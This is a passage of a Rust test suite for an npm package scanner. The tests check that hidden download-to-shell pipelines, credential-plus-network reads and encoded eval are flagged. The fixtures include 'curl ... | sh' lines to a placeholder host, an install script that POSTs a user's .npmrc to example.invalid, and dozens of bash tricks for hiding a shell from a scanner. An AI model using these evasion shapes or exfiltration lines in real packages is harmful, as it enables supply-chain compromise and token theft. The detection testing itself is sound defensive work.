        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\npython3 - <<EOF\nprint(\"$USAGE\")\nEOF\n"),
        // An unquoted body runs its substitutions when it is read.
        format!("cat <<EOF\n$(true)\n{pipeline}EOF\n"),
        // `cat` (or the printer) does not mean cat.
        format!("cat() {{ sh; }}\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("alias cat=sh\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("PATH=./bin:$PATH\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("head() {{ sh; }}\ncat <<'EOF' | head\n{pipeline}EOF\n"),
        // Headers outside the recognised shapes fail toward the signal.
        format!("cat - <<'EOF'\n{pipeline}EOF\n"),
        format!("cat <<'EOF'; sh x\n{pipeline}EOF\n"),
        // A backslash-newline joins the next line, so its `#` starts no
        // comment and the `|sh` after it runs the printed text.
        format!("read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\necho \"$USAGE\"\\\n#|sh\n"),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\necho \"$USAGE\"\\\n#|sh\n"),
        // A lone `&` starts another command on the line, and a continuation
        // joins the line to the command before it: the first word is not the
        // command that runs the variable.
        format!(
            "#!/usr/bin/env bash\nread -r -d '' USAGE <<'EOF'\n{pipeline}EOF\necho start & $SHELL -c \"$USAGE\"\n"
        ),
        format!(
            "#!/usr/bin/env bash\nread -r -d '' USAGE <<'EOF'\n{pipeline}EOF\n\"$BASH\" -c '\"$BASH\" -c \"$2\"' _ \\\n  echo \"$USAGE\"\n"
        ),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\necho start & $SHELL -c \"$USAGE\"\n"),
        // A quoted word that spans lines (or holds a `;`) hides the command
        // that really receives the variable behind an `echo`.
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\n$SHELL -c '\"$SHELL\" -c \"$1\"' 'x\necho ' \"$USAGE\"\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\n$SHELL -c '\"$SHELL\" -c \"$1\"' \"x\necho \" \"$USAGE\"\n"
        ),
        format!(
            "USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\n$SHELL -c '\"$SHELL\" -c \"$1\"' 'x\necho ' \"$USAGE\"\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\n$SHELL -c '\"$SHELL\" -c \"$1\"' '; echo ' \"$USAGE\"\n"
        ),
        // `printf -v` assigns, also quoted or joined to the name.
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf '-v' CMD '%s' \"$USAGE\"\n\"$BASH\" -c \"$CMD\"\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf -vCMD '%s' \"$USAGE\"\n\"$BASH\" -c \"$CMD\"\n"
        ),
        // ... or made by brace, tilde or glob expansion of the format word.
        // Bash runs command substitutions in the copied value's array
        // subscripts during arithmetic, or expands it as PS4 under `set -x`.
        format!(
            "read -r -d '' USAGE <<'EOF'\na[`\n{pipeline}`]\nEOF\nprintf {{-v,X}} %s \"$USAGE\"\necho $((X))\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf {{,-v}} X %s \"$USAGE\"\n[[ X -eq 0 ]]\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf {{-v,PS4}} %s \"$USAGE\"\nset -x\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf [-]v X %s \"$USAGE\"\necho $((X))\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf ''{{-v,X}} %s \"$USAGE\"\necho $((X))\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nOLDPWD=-v\nprintf ~- X %s \"$USAGE\"\necho $((X))\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nshopt -s extglob\nprintf @(-v) X %s \"$USAGE\"\necho $((X))\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf -?v X %s \"$USAGE\"\necho $((X))\n"
        ),
        // The heredoc is read into a variable the shell itself expands or
        // evaluates: PS4 under xtrace (from `set -x`, `set -o xtrace` or a
        // `-x` shebang), and the integer specials whose assignment runs
        // command substitutions in array subscripts (bash, sh, ksh). Such a
        // body is not shown-only, so it stays live and is scanned. (What
        // these shells run is the body's substitutions, which the download
        // pass does not descend into; the masking unit test pins those exact
        // shapes.)
        format!("read -r -d '' PS4 <<'EOF' || true\n{pipeline}EOF\nset -x\necho hi\n"),
        format!("PS4=$(cat <<'EOF'\n{pipeline}EOF\n)\nset -x\necho hi\n"),
        format!("#!/bin/bash -x\nread -r -d '' PS4 <<'EOF' || true\n{pipeline}EOF\necho hi\n"),
        format!("read -r -d '' PS4 <<'EOF' || true\n{pipeline}EOF\nset -o xtrace\necho hi\n"),
        format!("read -r -d '' OPTIND <<'EOF' || true\n{pipeline}EOF\necho hi\n"),
        format!("OPTIND=$(cat <<'EOF'\n{pipeline}EOF\n)\necho hi\n"),
        format!("read -r -d '' RANDOM <<'EOF' || true\n{pipeline}EOF\necho hi\n"),
        format!("local HISTCMD=$(cat <<'EOF'\n{pipeline}EOF\n)\necho hi\n"),
        format!("IFS= read -r SECONDS <<'EOF'\n{pipeline}EOF\necho hi\n"),
        // Bash 4+ rebinds `cat` through its command hash table or alias
        // arrays without the words `hash` or `alias`.
        format!("S=s\nBASH_CMDS[cat]=/bin/${{S}}h\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("S=s\nBASH_CMDS+=([cat]=/bin/${{S}}h)\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!(
            "shopt -s expand_aliases\nS=s\nBASH_ALIASES[cat]=/bin/${{S}}h\ncat <<'EOF'\n{pipeline}EOF\n"
        ),
        format!("S=s\nBASH_ALIASES+=([cat]=/bin/${{S}}h)\ncat <<'EOF'\n{pipeline}EOF\n"),
        // The value is reached without writing the variable's name.
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nv=US; v=${{v}}AGE\n\"$BASH\" -c \"${{!v}}\"\n"
        ),
        format!(
            "USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\nfor n in ${{!US*}}; do \"$BASH\" -c \"${{!n}}\"; done\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nf() {{ local -n r=$1; \"$BASH\" -c \"$r\"; }}\nf US''AGE\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\necho \"$USAGE\" >/dev/null\n\"$BASH\" -c \"$_\"\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\n\"$BASH\" -c \"$(set | grep ^USA | cut -d\\' -f2)\"\n"
        ),
        // A header command redefined as a function under a spelling the word
        // scan cannot read starts a shell that reads the heredoc on stdin.
        format!(
            "read() {{ /bin/s\\h; }}\nread -r -d '' USAGE <<'EOF' || true\n{pipeline}EOF\necho \"$USAGE\"\n"
        ),
        format!(
            "function read {{ s\\h; }}\nread -r -d '' USAGE <<'EOF' || true\n{pipeline}EOF\necho \"$USAGE\"\n"
        ),
        format!("c\\at() {{ /bin/s\\h; }}\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("'cat'() {{ /bin/s\\h; }}\ncat <<'EOF'\n{pipeline}EOF\n"),
        // An evaluating word spelled with a backslash, quotes or an
        // expansion still rebinds `cat`.
        format!("ha\\sh -p /bin/s\\h cat\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("'alias' cat=/bin/s''h\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("al${{E}}ias cat=/bin/s${{E}}h\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("S=s\ncommands[cat]=/bin/${{S}}h\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("path=(./bin $path)\ncat <<'EOF'\n{pipeline}EOF\n"),
        // `printf -v` after a redirection assigns PS4.
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf >&2 -vPS4 '%s' \"$USAGE\"\nset -x\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf >&2 '-v' PS4 '%s' \"$USAGE\"\nset -x\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf 2>/dev/null -vPS4 '%s' \"$USAGE\"\nset -x\n"
        ),
        format!(
            "read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf >&2 {{-v,PS4}} '%s' \"$USAGE\"\nset -x\n"
        ),
        // The printed value is evaluated as arithmetic: a subscript or
        // substring offset (bash, sh) or a numeric printf conversion (ksh).
        format!("read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\necho \"${{a[$USAGE]}}\"\n"),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\necho \"${{HOME:0:$USAGE}}\"\n"),
        format!("read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\necho $[$USAGE]\n"),
        format!("read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nprintf '%d\\n' \"$USAGE\"\n"),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\nprintf '%*s\\n' \"$USAGE\" x\n"),
        // `for PATH in` sets PATH, so `cat` may be a packaged wrapper.
        format!(
            "for PATH in \"$PWD/bin:/usr/bin:/bin\"; do\ncat <<'EOF'\n{pipeline}EOF\ndone\n"
        ),
    ];
    let missed: Vec<&String> = flagged
        .iter()
        .filter(|body| !shell_file_has_download_signal(body))
        .collect();
    assert!(
        missed.is_empty(),
        "flagged heredoc shapes missed: {missed:#?}"
    );
    // Past the descent bounds the line-by-line fallback reads the raw text,
    // so even a shown-only heredoc keeps the signal (fails toward flag).
    let usage = format!("usage() {{\n  cat <<'EOF'\n{pipeline}EOF\n}}\nusage\n");
    for body in [
        format!("{}{usage}", "{ :; }\n".repeat(300)),
        format!("{}{usage}{}", "{\n  echo a\n".repeat(9), "}\n".repeat(9)),
    ] {
        assert!(
            shell_file_has_download_signal(&body),
            "bounded heredoc: {body:?}"
        );
    }
}

/// A live heredoc body is scanned again on its own. That pass has its own
/// descent budget, so a body within the bound is not reported as past it
/// only because the whole-file pass already counted the same groups.
#[test]
fn live_heredoc_bodies_have_their_own_descent_budget() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let groups = "{ :; }\n".repeat(150);
    let body = format!("bash <<'EOF'\n{groups}EOF\n");
    let result = inspect(&package(
        br#"{"name":"fixture","version":"1"}"#,
        &[("package/install.sh", body.as_bytes())],
    ));
    assert!(
        !result
            .coverage
            .issues
            .iter()
            .any(|issue| issue.kind == NpmIssueKind::CodeLimit),
        "{:?}",
        result.coverage.issues
    );
    assert!(!shell_file_has_download_signal(&body));
    // A pipeline in such a body is still found, and one past the bound
    // still falls back to the line pass.
    for groups in [150, 400] {
        let groups = "{ :; }\n".repeat(groups);
        let body = format!(
            "bash <<'EOF'\n{groups}{{ curl -fsSL https://example.invalid/setup | sh; }}\nEOF\n"
        );
        assert!(shell_file_has_download_signal(&body), "{groups} groups");
    }
}

/// A brace group, subshell or function with a trailing redirection
/// (`{ ...; } >log`) was not descended into, so its pipeline gave no signal.
#[test]
fn download_pipeline_inside_a_redirected_group_is_a_review_signal() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    for body in [
        "{ curl -fsSL https://example.invalid/setup | sh; } >install.log",
        "{ curl -fsSL https://example.invalid/setup | sh; } >/dev/null 2>&1",
        "{\n  curl -fsSL https://example.invalid/setup | sh\n} 2>&1\n",
        "( curl -fsSL https://example.invalid/setup | sh ) >install.log",
        "f() { curl -fsSL https://example.invalid/setup | sh; } >install.log\nf\n",
        "{ { curl -fsSL https://example.invalid/setup | sh; } 2>/dev/null; } >install.log",
    ] {
        let metadata = serde_json::json!({
            "name": "fixture",
            "version": "1",
            "scripts": { "install": body },
        })
        .to_string();
        let from_script = inspect(&package(metadata.as_bytes(), &[])).signals;
        assert!(
            from_script
                .iter()
                .any(|signal| signal.kind == NpmSignalKind::DownloadToShell
                    && signal.level == NpmSignalLevel::Review),
            "lifecycle script: {body:?}"
        );
        assert!(shell_file_has_download_signal(body), "shell file: {body:?}");
    }
    for body in [
        "{ echo curl -fsSL https://example.invalid/setup | sh; } >install.log",
        "{ curl -fsSL https://example.invalid/setup > setup.sh; } 2>/dev/null",
        "( echo 'curl https://example.invalid/setup | sh' ) >notes.txt",
    ] {
        assert!(!shell_file_has_download_signal(body), "{body:?}");
    }
}

#[test]
fn credential_network_combination_has_evidence_and_lifecycle_link() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let metadata =
        br#"{"name":"fixture","version":"1","scripts":{"postinstall":"node install.js"}}"#;
    let code = b"const fs=require('node:fs');fetch('https://example.invalid/upload',{method:'POST',body:fs.readFileSync('/home/user/.npmrc')});";
    let result = inspect(&package(metadata, &[("package/install.js", code)]));
    let evidence = result
        .signals
        .iter()
        .find(|s| s.kind == NpmSignalKind::SensitiveReadWithNetwork)
        .unwrap();
    assert_eq!(evidence.lifecycle_events, vec!["postinstall"]);
    assert_eq!(evidence.level, NpmSignalLevel::Review);
    assert!(evidence.evidence.contains("does not prove"));
    assert!(!result.coverage.static_analysis_complete);
    let ordinary = inspect(&package(metadata, &[("package/install.js", b"const fs=require('fs');console.log(fs.readFileSync('./README.md','utf8'));fetch('https://example.invalid/version');")]));
    assert!(ordinary
        .signals
        .iter()
        .all(|s| s.level == NpmSignalLevel::Observation));
}

#[test]
fn comments_and_literal_api_names_do_not_create_code_capabilities() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let code = br#"/* require('fs');readFileSync('.npmrc');fetch('https://x');eval(Buffer.from('x','base64')) */ const example="require('child_process').exec('x')";"#;
    let result = inspect(&package(METADATA, &[("package/index.js", code)]));
    assert!(result.signals.is_empty(), "{result:?}");
    let encoded = inspect(&package(
        METADATA,
        &[(
            "package/index.js",
            b"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString());",
        )],
    ));
    assert!(encoded
        .signals
        .iter()
        .any(|s| s.kind == NpmSignalKind::EncodedDynamicExecution));
    assert!(encoded
        .coverage
        .issues
        .iter()
        .any(|i| i.kind == NpmIssueKind::DynamicCode));
}

#[test]
fn templates_dynamic_require_unsupported_code_and_nested_archives_are_incomplete() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    for (name, code, issue) in [
        (
            "package/a.js",
            b"const a=`value ${run()}`;".as_slice(),
            NpmIssueKind::UnsupportedCode,
        ),
        (
            "package/a.js",
            b"require(process.env.MODULE);".as_slice(),
            NpmIssueKind::DynamicCode,
        ),
        (
            "package/a.ts",
            b"const a:number=1;".as_slice(),
            NpmIssueKind::UnsupportedCode,
        ),
        (
            "package/a.wasm",
            b"\0asm\x01\0\0\0".as_slice(),
            NpmIssueKind::UnsupportedCode,
        ),
        (
            "package/a.dat",
            b"PK\x03\x04nested".as_slice(),
            NpmIssueKind::NestedArchive,
        ),
    ] {
        let result = inspect(&package(METADATA, &[(name, code)]));
        assert!(result.coverage.archive_complete);
        assert!(!result.coverage.static_analysis_complete);
        assert!(
            result.coverage.issues.iter().any(|i| i.kind == issue),
            "{result:?}"
        );
    }
}

#[test]
fn explicit_main_and_lifecycle_targets_are_inspected_without_js_extension() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let metadata = br#"{"name":"fixture","version":"1","main":"payload.dat","scripts":{"install":"node payload.dat"}}"#;
    let result = inspect(&package(
        metadata,
        &[(
            "package/payload.dat",
            b"eval(Buffer.from('eA==','base64').toString());",
        )],
    ));
    assert_eq!(result.coverage.inspected_code_files, 1);
    assert!(result
        .signals
        .iter()
        .any(|s| s.kind == NpmSignalKind::EncodedDynamicExecution));
}

#[test]
fn oversized_excerpts_never_retain_a_partial_custom_secret_before_dlp() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let secret = format!("PRIVATE_START{}PRIVATE_END", "x".repeat(600));
    let metadata = serde_json::to_vec(&serde_json::json!({
        "name": "fixture", "version": "1.0.0", "scripts": { "postinstall": secret }
    }))
    .unwrap();
    let result = inspect(&package(&metadata, &[]));
    let evidence = &result
        .signals
        .iter()
        .find(|signal| signal.kind == NpmSignalKind::LifecycleScript)
        .unwrap()
        .evidence;
    assert!(!evidence.contains("PRIVATE_START"));
    assert!(evidence.contains("withheld"));
    let compiled = crate::redact::CompiledCustomPatterns::new_silent(std::slice::from_ref(&secret));
    let mut projected = serde_json::to_value(&result).unwrap();
    crate::redact::redact_json_strings(&mut projected, &compiled);
    let text = projected.to_string();
    assert!(!text.contains("PRIVATE_START"));
    assert!(!text.contains("PRIVATE_END"));
    let filename = format!("PRIVATE_START{}PRIVATE_END", "x".repeat(5000));
    let output = read_npm_tarball(
        package(METADATA, &[]).as_slice(),
        &filename,
        &NpmLimits::default(),
    );
    assert!(!output.artifact.filename.contains("PRIVATE_START"));
}

#[test]
fn code_metadata_and_signal_limits_keep_archive_identities_but_not_complete_claims() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let bytes = package(
        METADATA,
        &[
            ("package/a.js", b"fetch('https://example.invalid');"),
            ("package/b.js", b"eval('1');"),
        ],
    );
    for limits in [
        NpmLimits {
            code_member_bytes: 1,
            ..NpmLimits::default()
        },
        NpmLimits {
            code_files: 1,
            ..NpmLimits::default()
        },
        NpmLimits {
            total_code_bytes: 1,
            ..NpmLimits::default()
        },
        NpmLimits {
            signals: 0,
            ..NpmLimits::default()
        },
        NpmLimits {
            metadata_bytes: 1,
            ..NpmLimits::default()
        },
    ] {
        let result = read_npm_tarball(bytes.as_slice(), "fixture.tgz", &limits);
        assert!(result.coverage.archive_complete);
        assert!(!result.coverage.static_analysis_complete);
        assert_eq!(result.files.len(), 3);
        assert!(result.files.iter().all(|f| f.sha256.len() == 64));
    }
}

#[test]
fn native_presence_and_implicit_build_are_observations_and_partial_native_is_explicit() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let mut elf = vec![0u8; 64];
    elf[..7].copy_from_slice(b"\x7fELF\x02\x01\x01");
    elf[16..18].copy_from_slice(&3u16.to_le_bytes());
    elf[18..20].copy_from_slice(&62u16.to_le_bytes());
    elf[20..24].copy_from_slice(&1u32.to_le_bytes());
    elf[52..54].copy_from_slice(&64u16.to_le_bytes());
    elf[54..56].copy_from_slice(&56u16.to_le_bytes());
    elf[58..60].copy_from_slice(&64u16.to_le_bytes());
    let ordinary = inspect(&package(METADATA, &[("package/addon.node", &elf)]));
    assert!(ordinary
        .signals
        .iter()
        .any(|s| s.kind == NpmSignalKind::NativeArtifact));
    assert!(ordinary
        .signals
        .iter()
        .all(|s| s.level == NpmSignalLevel::Observation));
    let truncated = inspect(&package(METADATA, &[("package/addon.node", b"\x7fELF")]));
    assert!(truncated
        .coverage
        .issues
        .iter()
        .any(|i| i.kind == NpmIssueKind::NativeIncomplete));
    let build = inspect(&package(
        METADATA,
        &[("package/binding.gyp", br#"{"targets":[]}"#)],
    ));
    assert!(build.metadata.as_ref().unwrap().implicit_node_gyp_install);
    assert!(build
        .signals
        .iter()
        .any(|s| s.kind == NpmSignalKind::ImplicitNativeBuild));
    assert!(build
        .signals
        .iter()
        .all(|s| s.level == NpmSignalLevel::Observation));
}

#[test]
fn deterministic_malformed_corpus_never_panics_or_exceeds_reader_output_bounds() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    // Deliberately independent of wall clock or rand: reproducible small-input
    // fuzz smoke corpus with valid gzip wrapping arbitrary tar-like bytes.
    let limits = NpmLimits {
        compressed_bytes: 8192,
        decompressed_bytes: 8192,
        member_bytes: 1024,
        headers: 8,
        signals: 4,
        ..NpmLimits::default()
    };
    let mut state = 0x9e3779b97f4a7c15u64;
    for iteration in 0..512usize {
        let mut bytes = vec![0u8; iteration % 4096];
        for byte in &mut bytes {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            *byte = state as u8;
        }
        let compressed = gzip(&bytes);
        for input in [bytes.as_slice(), compressed.as_slice()] {
            let result = read_npm_tarball(input, "fuzz.tgz", &limits);
            assert!(result.files.len() <= limits.headers);
            assert!(result.signals.len() <= limits.signals);
            assert!(result.coverage.issues.len() <= 256);
            assert!(!result.coverage.archive_complete);
        }
    }
}
